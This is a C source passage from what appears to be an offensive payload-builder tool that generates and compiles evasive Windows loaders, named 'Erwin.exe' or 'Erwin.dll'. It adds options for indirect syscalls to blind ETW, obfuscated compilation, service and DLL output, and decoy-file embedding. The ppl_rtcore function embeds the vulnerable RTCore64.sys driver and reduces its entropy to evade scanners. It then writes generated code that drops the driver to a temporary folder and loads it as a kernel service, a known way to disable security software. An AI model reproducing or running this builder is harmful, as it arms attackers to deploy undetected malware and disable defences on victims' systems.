		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW TraceEvent) functionality in compilation...\n");
	}

	if (indirectFlag_etw_peventwritefull) {
		printf("[+] Including INDIRECT SYSCALLS (Hells Hall ETW pEventWriteFull) functionality in compilation...\n");
	}

	//misc
	if (miscFlag_nowindow) {
		strcat(sourceFiles, "/SUBSYSTEM:WINDOWS ");
		//strcat(compilerFlags, " -DMISC_NOWINDOW");
		printf("[+] Including MISC (No Window) functionality in compilation...\n");
	}

	if (miscFlag_service) {
		strcat(sourceFiles, "output\\code\\service.c output\\code\\service.h advapi32.lib ");
		//strcat(compilerFlags, " -DMISC_SERVICE");
		printf("[+] Including MISC (Run as a Service) functionality in compilation...\n");
	}

	if (miscFlag_dll) {
		strcat(sourceFiles, "output\\code\\dll.h output\\code\\dllmain.cpp /LD ");
		//strcat(compilerFlags, " -DMISC_DLL /LD");
		printf("[+] Including MISC (DLL Output) functionality in compilation...\n");
	}

	if (miscFlag_inflate) {
		//strcat(compilerFlags, " -DMISC_INFLATE");
		printf("[+] Including MISC (Inflate) functionality in compilation...\n");
	}


	if (miscFlag_decoy) {
		strcat(sourceFiles, "output\\code\\decoy.c output\\code\\EntropyReducer.h output\\code\\EntropyReducer.c ");
		//strcat(compilerFlags, " -DMISC_DECOY");
		printf("[+] Including MISC (File Decoy) functionality in compilation...\n");
	}

	if (miscFlag_printf) {
		//strcat(compilerFlags, " -DMISC_NOPRINT");
		printf("[+] Including MISC (No Print) functionality in compilation...\n");
	}

	// Find path to clang-cl.exe
	char compilerPath[MAX_PATH];

	// Try x64 path first
	sprintf(compilerPath, "%s\\founding\\compile\\llvm\\x64\\bin\\clang-cl.exe", exePath);

	// Build the full compilation command, properly handling quotes and spaces
	char linkOptions[1024];
	sprintf(linkOptions, "/link /SUBSYSTEM:CONSOLE /MACHINE:X64 /NODEFAULTLIB /ENTRY:_start kernel32.lib user32.lib msvcrt.lib bcrypt.lib legacy_stdio_definitions.lib ucrt.lib vcruntime.lib oldnames.lib");

	// Use simple command format
	sprintf(compileCommand, "\"%s\" %s /Fo\"output\\code\\\\\" /Fe\"%s\" %s %s",
		compilerPath,
		compilerFlags,
		outputFile,
		sourceFiles,
		linkOptions);

	printf("[+] Executing compile command: %s\n", compileCommand);

	printf("[+] Compiling with LLVM obfuscation, may take a while...\n");

	// Execute the compilation command
	STARTUPINFOA Si = { sizeof(Si) };
	PROCESS_INFORMATION Pi;

	if (!CreateProcessA(NULL, compileCommand, NULL, NULL, FALSE, 0, NULL, NULL, &Si, &Pi)) {
		printf("CreateProcess failed (%d).\n", GetLastError());
		return;
	}

	WaitForSingleObject(Pi.hProcess, INFINITE);

	DWORD exitCode;
	if (GetExitCodeProcess(Pi.hProcess, &exitCode)) {
		if (exitCode == 0) {
			printf("[+] Compilation successful.\n");
			if (miscFlag_dll) {
				printf("[+] Shinzo wo Sasageyo! Erwin.dll Created.\n");
				printf("[+] To test your DLL use the \\founding\\misc\\dll_test\\dlltest.exe\n");
			}
			else {
				printf("[+] Shinzo wo Sasageyo! Erwin.exe Created.\n");
			}
		}
		else {
			printf("[-] Compilation failed (Code: %d).\n", exitCode);
		}
	}

	CloseHandle(Pi.hProcess);
	CloseHandle(Pi.hThread);


	RemoveObjFilesInOutputFolder_obj();
	RemoveObjFilesInOutputFolder_pch();
}






void ReadAndPrintFile(const char* filename) {
	FILE* file = fopen(filename, "r");
	if (file == NULL) {
		printf("Error opening file for reading.\n");
		return;
	}

	char buffer[256];
	while (fgets(buffer, sizeof(buffer), file) != NULL) {
		printf("%s", buffer);
	}

	fclose(file);
}


void Headers(const char* header) 
{
	if (strcmp(header, "mac") == 0) 
	{
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#include <stdio.h>\n\n\n");
		
	}
	else if (strcmp(header, "uuid") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#include <stdio.h>\n\n\n");
	}
	else if (strcmp(header, "ipv4") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#include <stdio.h>\n\n\n");
	}
	else if (strcmp(header, "ipv6") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#include <stdio.h>\n\n\n");
	}
	else if (strcmp(header, "aes") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include <stdio.h>\n");
		printf("#include <bcrypt.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#pragma comment(lib, \"Bcrypt.lib\")\n\n\n");
	}
	else if (strcmp(header, "rc4") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include \"api_hashing.h\"\n");
		printf("#include \"typedef.h\"\n");
		printf("#include <stdio.h>\n\n\n");
	}
	else if (strcmp(header, "xor") == 0) {
		printf("#define _CRT_SECURE_NO_WARNINGS\n");
		printf("#include <windows.h>\n");
		printf("#include <stdio.h>\n\n\n");
	}
}


BOOL AppendInputPayload(IN INT MultipleOf, IN PBYTE pPayload, IN DWORD dwPayloadSize, OUT PBYTE* ppAppendedPayload, OUT DWORD* pAppendedPayloadSize) {

	PBYTE	Append = NULL;
	DWORD	AppendSize = NULL;

	// calculating new size
	AppendSize = dwPayloadSize + MultipleOf - (dwPayloadSize % MultipleOf);

	// allocating new payload buffer
	Append = (PBYTE)HeapAlloc(GetProcessHeap(), 0, AppendSize);
	if (Append == NULL)
		return FALSE;

	// filling all with nops
	memset(Append, 0x90, AppendSize);

	// copying the payload bytes over
	memcpy(Append, pPayload, dwPayloadSize);

	// returning
	*ppAppendedPayload = Append;
	*pAppendedPayloadSize = AppendSize;

	return TRUE;
}


void createfile_outputfolder(const char* filename) {
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the filename to a wide string
	mbstowcs(wFilename, filename, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the output folder path
	wsprintfW(outputPath, L"%s\\output\\code", exePath);

	// Create the /output/ folder if it doesn't exist
	CreateDirectoryW(outputPath, NULL);

	// Append the specified filename to the /output/ path
	wsprintfW(outputPath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Create the file with the specified name
	HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return;
	}

	// Close the file handle
	CloseHandle(hFile);
}


void createfile_enc_header() {
	WCHAR exePath[MAX_PATH];
	WCHAR outputPath[MAX_PATH];

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Create the output folder path
	wsprintfW(outputPath, L"%s\\output\\code", exePath);

	// Create the /output/ folder if it doesn't exist
	CreateDirectoryW(outputPath, NULL);

	// Append "exec.c" to the /output/ path
	wsprintfW(outputPath, L"%s\\output\\code\\enc.h", exePath);

	// Create the file exec.c
	HANDLE hFile = CreateFileW(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return;
	}

	// Close the file handle
	CloseHandle(hFile);
}


void copyFileContents_enc_header(const char* filenameBase) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR filename[MAX_PATH];

	// Convert the input parameter to a proper filename with .c extension
	wsprintfW(filename, L"%S.h", filenameBase);  // Converts to WCHAR and appends ".c"

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\enc-obf\\%s", exePath, filename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\enc.h", exePath);

	// Open the source file for reading
	FILE* inputFile;
	_wfopen_s(&inputFile, inputFilePath, L"r");
	if (!inputFile) {
		return;
	}

	// Open exec.c for writing
	FILE* outputFile;
	_wfopen_s(&outputFile, outputFilePath, L"w");
	if (!outputFile) {
		fclose(inputFile);
		return;
	}

	// Read from source file and write to exec.c
	char buffer[256];
	while (fgets(buffer, sizeof(buffer), inputFile) != NULL) {
		fputs(buffer, outputFile);
	}

	// Close the files
	fclose(inputFile);
	fclose(outputFile);
}


void copyFileContents_executionFolder(const char* folderName, const char* filenameBase) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR filename[MAX_PATH];

	// Convert the input parameter to a proper filename with .c extension
	wsprintfW(filename, L"%S.c", filenameBase);  // Converts to WCHAR and appends ".c"

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\execution\\%S\\%s", exePath, folderName, filename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\exec.c", exePath);

	// Open the source file for reading
	FILE* inputFile;
	_wfopen_s(&inputFile, inputFilePath, L"r");
	if (!inputFile) {
		return;
	}

	// Open exec.c for writing
	FILE* outputFile;
	_wfopen_s(&outputFile, outputFilePath, L"w");
	if (!outputFile) {
		fclose(inputFile);
		return;
	}

	// Read from source file and write to exec.c
	char buffer[256];
	while (fgets(buffer, sizeof(buffer), inputFile) != NULL) {
		fputs(buffer, outputFile);
	}

	// Close the files
	fclose(inputFile);
	fclose(outputFile);
}



void copyFileContents_executionFolder_filename(const char* folderName, const char* filenameBase) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the input parameter to a wide string
	mbstowcs(wFilename, filenameBase, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\execution\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Open the source file for reading
	FILE* inputFile;
	_wfopen_s(&inputFile, inputFilePath, L"r");
	if (!inputFile) {
		return;
	}

	// Open the output file for writing
	FILE* outputFile;
	_wfopen_s(&outputFile, outputFilePath, L"w");
	if (!outputFile) {
		fclose(inputFile);
		return;
	}

	// Read from source file and write to the output file
	char buffer[256];
	while (fgets(buffer, sizeof(buffer), inputFile) != NULL) {
		fputs(buffer, outputFile);
	}

	// Close the files
	fclose(inputFile);
	fclose(outputFile);
}


void copyFileContents_evasionFolder(const char* folderName, const char* filenameBase) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the input parameter to a wide string
	mbstowcs(wFilename, filenameBase, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\implementations\\evasion\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Open the source file for reading
	FILE* inputFile;
	_wfopen_s(&inputFile, inputFilePath, L"r");
	if (!inputFile) {
		return;
	}

	// Open the output file for writing
	FILE* outputFile;
	_wfopen_s(&outputFile, outputFilePath, L"w");
	if (!outputFile) {
		fclose(inputFile);
		return;
	}

	// Read from source file and write to the output file
	char buffer[256];
	while (fgets(buffer, sizeof(buffer), inputFile) != NULL) {
		fputs(buffer, outputFile);
	}

	// Close the files
	fclose(inputFile);
	fclose(outputFile);
}



void copyFileContents_miscFolder(const char* folderName, const char* filenameBase) {
	WCHAR exePath[MAX_PATH];
	WCHAR inputFilePath[MAX_PATH], outputFilePath[MAX_PATH];
	WCHAR wFilename[MAX_PATH];

	// Convert the input parameter to a wide string
	mbstowcs(wFilename, filenameBase, MAX_PATH);

	// Get the path of the running executable
	DWORD length = GetModuleFileNameW(NULL, exePath, MAX_PATH);
	if (length == 0 || length >= MAX_PATH) {
		return;
	}

	// Remove the executable name to get the folder path
	WCHAR* lastSlash = wcsrchr(exePath, L'\\');
	if (lastSlash) *lastSlash = L'\0';  // Terminate string at last backslash

	// Construct the full paths
	wsprintfW(inputFilePath, L"%s\\founding\\misc\\%S\\%s", exePath, folderName, wFilename);
	wsprintfW(outputFilePath, L"%s\\output\\code\\%s", exePath, wFilename);

	// Open the source file for reading
	FILE* inputFile;
	_wfopen_s(&inputFile, inputFilePath, L"r");
	if (!inputFile) {
		return;
	}

	// Open the output file for writing
	FILE* outputFile;
	_wfopen_s(&outputFile, outputFilePath, L"w");
	if (!outputFile) {
		fclose(inputFile);
		return;
	}

	// Read from source file and write to the output file
	char buffer[256];
	while (fgets(buffer, sizeof(buffer), inputFile) != NULL) {
		fputs(buffer, outputFile);
	}

	// Close the files
	fclose(inputFile);
	fclose(outputFile);
}


// Add to your CheckAndRemoveFlag function or create a new one
char* CheckAndRemoveFlagWithValue(int* argc, char* argv[], const char* flag) {
	for (int i = 1; i < *argc - 1; i++) {
		if (strcmp(argv[i], flag) == 0) {
			// Check if the next argument doesn't start with "--" (meaning it's a value, not another flag)
			if (argv[i + 1][0] != '-' || argv[i + 1][1] != '-') {
				char* value = _strdup(argv[i + 1]); // Make a copy of the value

				// Remove both the flag and its value from the arguments
				for (int j = i; j < *argc - 2; j++) {
					argv[j] = argv[j + 2];
				}
				(*argc) -= 2;
				return value;
			}
			// If the next argument is another flag, treat this as a flag without a value
			break;
		}
	}
	return NULL;
}



BOOL ppl_rtcore(int argc, char* argv[]) {
	// Get the path of the current executable for locating the driver
	char exePath[MAX_PATH];
	DWORD pathLength = GetModuleFileNameA(NULL, exePath, MAX_PATH);
	if (pathLength == 0 || pathLength >= MAX_PATH) {
		printf("[-] Failed to get the full path of the executable.\n");
		return FALSE;
	}

	// Extract directory path by removing the executable name
	char* lastBackslash = strrchr(exePath, '\\');
	if (lastBackslash) {
		*lastBackslash = '\0'; // Truncate to directory path
	}

	// Construct the path to RTCore64.sys driver
	char driverPath[MAX_PATH];
	sprintf(driverPath, "%s\\founding\\implementations\\ppl\\ppl_rtcore\\RTCore64.sys", exePath);

	printf("[+] Embedding RTCore64.sys driver\n");

	// Read the driver file into memory
	DWORD fileSize = 0;
	unsigned char* fileData = NULL;

	if (!ReadPayloadFile2(driverPath, &fileSize, &fileData)) {
		printf("[-] Failed to read RTCore64.sys driver file\n");
		return FALSE;
	}

	printf("[+] Successfully read RTCore64.sys (%d bytes)\n", fileSize);

	// Copy the EntropyReducer files from the decoy folder
	copyFileFromFolder_misc("decoy", "EntropyReducer.c");
	copyFileFromFolder_misc("decoy", "EntropyReducer.h");

	// Create a binary file of the raw data
	char binPath[MAX_PATH];
	sprintf(binPath, "%s\\output\\code\\RTCore64.bin", exePath);

	HANDLE hBinFile = CreateFileA(binPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hBinFile != INVALID_HANDLE_VALUE) {
		// Write the raw data
		DWORD bytesWritten = 0;
		WriteFile(hBinFile, fileData, fileSize, &bytesWritten, NULL);
		CloseHandle(hBinFile);
		printf("[+] Created binary version at: %s\n", binPath);

		// Run EntropyReducer on the created binary file
		char entropyReducerCmd[MAX_PATH * 2];
		sprintf(entropyReducerCmd, "\"%s\\founding\\misc\\decoy\\EntropyReducer.exe\" \"%s\"",
			exePath, binPath);

		// Execute EntropyReducer
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		printf("[+] Running entropy reduction on binary...\n");
		if (CreateProcessA(NULL, entropyReducerCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			// Wait for the process to finish
			WaitForSingleObject(pi.hProcess, INFINITE);

			// Get exit code
			DWORD exitCode;
			if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
				if (exitCode == 0) {
					printf("[+] Successfully reduced entropy of RTCore64.sys\n");
				}
				else {
					printf("[-] EntropyReducer failed (Exit code: %d)\n", exitCode);
					HeapFree(GetProcessHeap(), 0, fileData);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					return FALSE;
				}
			}

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		else {
			printf("[-] Failed to run EntropyReducer.exe (Error: %d)\n", GetLastError());
			HeapFree(GetProcessHeap(), 0, fileData);
			return FALSE;
		}
	}
	else {
		printf("[-] Failed to create binary file\n");
		HeapFree(GetProcessHeap(), 0, fileData);
		return FALSE;
	}

	// Free the original file data, we don't need it anymore
	HeapFree(GetProcessHeap(), 0, fileData);
	fileData = NULL;

	// Now read the entropy-reduced file
	char reducedFilePath[MAX_PATH];
	sprintf(reducedFilePath, "%s.ER", binPath);

	HANDLE hReducedFile = CreateFileA(reducedFilePath, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hReducedFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open entropy-reduced file: %s (Error: %d)\n",
			reducedFilePath, GetLastError());
		return FALSE;
	}

	// Get file size of the reduced file
	fileSize = GetFileSize(hReducedFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		printf("[-] Failed to get entropy-reduced file size (Error: %d)\n", GetLastError());
		CloseHandle(hReducedFile);
		return FALSE;
	}

	// Allocate memory for the entropy-reduced data
	fileData = (unsigned char*)malloc(fileSize);
	if (!fileData) {
		printf("[-] Failed to allocate memory for entropy-reduced file\n");
		CloseHandle(hReducedFile);
		return FALSE;
	}

	// Read the entropy-reduced file
	DWORD bytesRead = 0;
	if (!ReadFile(hReducedFile, fileData, fileSize, &bytesRead, NULL)) {
		printf("[-] Failed to read entropy-reduced file (Error: %d)\n", GetLastError());
		free(fileData);
		CloseHandle(hReducedFile);
		return FALSE;
	}

	CloseHandle(hReducedFile);
	printf("[+] Using entropy-reduced driver (%d bytes) for embedding\n", bytesRead);

	// Create the output file for the driver
	char outputPath[MAX_PATH];
	sprintf(outputPath, "%s\\output\\enc_ppl_rtcore.c", exePath);

	FILE* driverSource = fopen(outputPath, "w");
	if (!driverSource) {
		printf("[-] Failed to create output file\n");
		free(fileData);
		return FALSE;
	}

	// Write the function that extracts and uses the RTCore64 driver
	fprintf(driverSource,
		"#define _CRT_SECURE_NO_WARNINGS\n"
		"#include <windows.h>\n"
		"#include \"EntropyReducer.h\"\n"
		"#include \"api_hashing.h\"\n"
		"#include <stdio.h>\n\n"
		"// Embedded RTCore64.sys driver data (size: %u bytes)\n"
		"unsigned char RTCore64_sys[] = {\n",
		fileSize);

	// Write the file data as a byte array
	for (DWORD i = 0; i < fileSize; i++) {
		if (i % 16 == 0) fprintf(driverSource, "    ");
		fprintf(driverSource, "0x%02X", fileData[i]);
		if (i < fileSize - 1) fprintf(driverSource, ", ");
		if (i % 16 == 15 || i == fileSize - 1) fprintf(driverSource, "\n");
	}

	// Continue writing the driver handling functions
	fprintf(driverSource,
		"};\n\n"
		"const DWORD RTCore64_sys_len = %d;\n\n"
		"BOOL WriteRTCore64Driver(const char* path) {\n"
		"    SIZE_T decoded_size = NULL;\n"
		"    PBYTE decoded_data = NULL;\n\n"
		"    // Deobfuscate the driver data\n"
		"    if (!Deobfuscate(RTCore64_sys, sizeof(RTCore64_sys), &decoded_data, &decoded_size)) {\n"
		"        printf(\"[!] Failed to deobfuscate driver data\\n\");\n"
		"        return FALSE;\n"
		"    }\n\n"
		"    // Write the driver to disk\n"
		"    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
		"    if (hFile == INVALID_HANDLE_VALUE) {\n"
		"        printf(\"[!] Failed to create driver file: %%d\\n\", GetLastError());\n"
		"        return FALSE;\n"
		"    }\n\n"
		"    DWORD bytesWritten = 0;\n"
		"    BOOL success = WriteFile(hFile, decoded_data, decoded_size, &bytesWritten, NULL);\n"
		"    CloseHandle(hFile);\n\n"
		"    if (!success || bytesWritten != decoded_size) {\n"
		"        printf(\"[!] Failed to write driver data: %%d\\n\", GetLastError());\n"
		"        return FALSE;\n"
		"    }\n\n"
		"    return TRUE;\n"
		"}\n\n"
		"BOOL LoadRTCore64Driver(const char* serviceName) {\n"
		"    char tempPath[MAX_PATH] = {0};\n"
		"    char driverPath[MAX_PATH] = {0};\n\n"
		"    // Create a temporary path for the driver\n"
		"    GetTempPathA(MAX_PATH, tempPath);\n"
		"    sprintf(driverPath, \"%%s\\\\%%s.sys\", tempPath, serviceName);\n\n"
		"    // Write the driver to disk\n"
		"    if (!WriteRTCore64Driver(driverPath)) {\n"
		"        return FALSE;\n"
		"    }\n\n"
		"    // Open SCM\n"
		"    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);\n"
		"    if (hSCM == NULL) {\n"
		"        printf(\"[!] Failed to open SCM: %%d\\n\", GetLastError());\n"
		"        DeleteFileA(driverPath);\n"
		"        return FALSE;\n"
		"    }\n\n"
		"    // Create service\n"
		"    SC_HANDLE hService = CreateServiceA(\n"
		"        hSCM, serviceName, serviceName,\n"
		"        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,\n"
		"        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,\n"
		"        driverPath, NULL, NULL, NULL, NULL, NULL);\n\n"
		"    if (hService == NULL) {\n"
		"        DWORD err = GetLastError();\n"
		"        if (err == ERROR_SERVICE_EXISTS) {\n"
		"            hService = OpenServiceA(hSCM, serviceName, SERVICE_ALL_ACCESS);\n"
		"            if (hService == NULL) {\n"
		"                printf(\"[!] Failed to open existing service: %%d\\n\", GetLastError());\n"
		"                CloseServiceHandle(hSCM);\n"
		"                DeleteFileA(driverPath);\n"
		"                return FALSE;\n"
		"            }\n"
		"        } else {\n"
		"            printf(\"[!] Failed to create service: %%d\\n\", err);\n"
		"            CloseServiceHandle(hSCM);\n"
		"            DeleteFileA(driverPath);\n"
		"            return FALSE;\n"
		"        }\n"
		"    }\n\n"
		"    // Start the service\n"
		"    BOOL result = StartServiceA(hService, 0, NULL);\n"
		"    if (!result) {\n"
		"        DWORD err = GetLastError();\n"
		"        if (err != ERROR_SERVICE_ALREADY_RUNNING) {\n"
		"            printf(\"[!] Failed to start service: %%d\\n\", err);\n"
		"            CloseServiceHandle(hService);\n"
		"            CloseServiceHandle(hSCM);\n"
		"            DeleteFileA(driverPath);\n"
		"            return FALSE;\n"
		"        }\n"
		"    }\n\n"
		"    printf(\"[+] RTCore64 driver loaded successfully\\n\");\n\n"
		"    // Clean up handles\n"
		"    CloseServiceHandle(hService);\n"
		"    CloseServiceHandle(hSCM);\n\n"
		"    return TRUE;\n"
		"}\n\n"
		"/*\n"
		"Example usage:\n\n"
		"// Load driver with a service name\n"
		"if (LoadRTCore64Driver(\"RTCore64\")) {\n"
		"    printf(\"[+] Driver loaded successfully!\\n\");\n"
		"    // Use the driver...\n"
		"}\n"
		"*/\n",
		fileSize
	);

	fclose(driverSource);
	free(fileData);

	printf("[+] RTCore64.sys driver has been embedded\n");
	printf("[+] Output file saved to: %s\n", outputPath);
	printf("[+] Binary file saved to: %s\n", binPath);
	printf("[+] Entropy-reduced file saved to: %s.ER\n", binPath);

	return TRUE;
}


void embedDecoy(const char* decoyFile) {
	printf("[+] Embedding decoy file: %s\n", decoyFile);

	// Read the decoy file into memory to create the initial binary
	DWORD fileSize = 0;
	unsigned char* fileData = NULL;

	if (!ReadPayloadFile(decoyFile, &fileSize, &fileData)) {
		printf("[-] Failed to read decoy file\n");
		return;
	}


	copyFileFromFolder_misc("decoy", "EntropyReducer.c");
	copyFileFromFolder_misc("decoy", "EntropyReducer.h");

	// Determine the file extension
	const char* extension = strrchr(decoyFile, '.');
	if (!extension) {
		extension = ".txt"; // Default to .txt if no extension found
	}

	// Get filename (without path) for binary output
	const char* fileName = strrchr(decoyFile, '\\');
	if (fileName) {
		fileName++; // Skip the backslash
	}
	else {
		fileName = decoyFile; // Use the full input if no backslash found
	}

	// Create a binary file of the raw data
	char binPath[MAX_PATH];
	sprintf(binPath, "output\\code\\%s.bin", fileName);

	HANDLE hBinFile = CreateFileA(binPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hBinFile != INVALID_HANDLE_VALUE) {
		// Write the raw data (without the preamble bytes)
		DWORD bytesWritten = 0;
		WriteFile(hBinFile, fileData + 2, fileSize - 2, &bytesWritten, NULL);
		CloseHandle(hBinFile);
		printf("[+] Created binary version at: %s\n", binPath);

		// Run EntropyReducer on the created binary file
		char exePath[MAX_PATH];
		GetModuleFileNameA(NULL, exePath, MAX_PATH);
		char* lastSlash = strrchr(exePath, '\\');
		if (lastSlash) *lastSlash = '\0'; // Truncate to directory path

		char entropyReducerCmd[MAX_PATH * 2];
		sprintf(entropyReducerCmd, "\"%s\\founding\\misc\\decoy\\EntropyReducer.exe\" \"%s\"",
			exePath, binPath);

		// Expected output file path (with .ER extension)
		char reducedFilePath[MAX_PATH];
		sprintf(reducedFilePath, "%s.ER", binPath);

		// Execute EntropyReducer
		STARTUPINFOA si = { sizeof(si) };
		PROCESS_INFORMATION pi;

		printf("[+] Running entropy reduction on binary...\n");
		if (CreateProcessA(NULL, entropyReducerCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			// Wait for the process to finish
			WaitForSingleObject(pi.hProcess, INFINITE);

			// Get exit code
			DWORD exitCode;
			if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
				if (exitCode == 0) {
					printf("[+] Successfully reduced entropy of binary file\n");
				}
				else {
					printf("[-] EntropyReducer failed (Exit code: %d)\n", exitCode);
					free(fileData);
					CloseHandle(pi.hProcess);
					CloseHandle(pi.hThread);
					return;
				}
			}

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		else {
			printf("[-] Failed to run EntropyReducer.exe (Error: %d)\n", GetLastError());
			free(fileData);
			return;
		}
	}
	else {
		printf("[-] Failed to create binary file\n");
		free(fileData);
		return;
	}

	// Free the original file data, we don't need it anymore
	free(fileData);
	fileData = NULL;

	// Now read the entropy-reduced file directly using file functions, not ReadPayloadFile
	// because ReadPayloadFile assumes preamble bytes which the ER file doesn't have
	char reducedFilePath[MAX_PATH];
	sprintf(reducedFilePath, "%s.ER", binPath);

	HANDLE hReducedFile = CreateFileA(reducedFilePath, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hReducedFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to open entropy-reduced file: %s (Error: %d)\n",
			reducedFilePath, GetLastError());
		return;
	}

	// Get file size of the reduced file
	fileSize = GetFileSize(hReducedFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		printf("[-] Failed to get entropy-reduced file size (Error: %d)\n", GetLastError());
		CloseHandle(hReducedFile);
		return;
	}

	// Allocate memory for the entropy-reduced data
	fileData = (unsigned char*)malloc(fileSize);
	if (!fileData) {
		printf("[-] Failed to allocate memory for entropy-reduced file\n");
		CloseHandle(hReducedFile);
		return;
	}

	// Read the entropy-reduced file
	DWORD bytesRead = 0;
	if (!ReadFile(hReducedFile, fileData, fileSize, &bytesRead, NULL)) {
		printf("[-] Failed to read entropy-reduced file (Error: %d)\n", GetLastError());
		free(fileData);
		CloseHandle(hReducedFile);
		return;
	}

	CloseHandle(hReducedFile);
	printf("[+] Using entropy-reduced file (%d bytes) for embedding\n", bytesRead);

	// Create the decoy.c file with the extraction function
	createfile_outputfolder("decoy.c");
	FILE* decoySource = fopen("output\\code\\decoy.c", "w");
	if (!decoySource) {
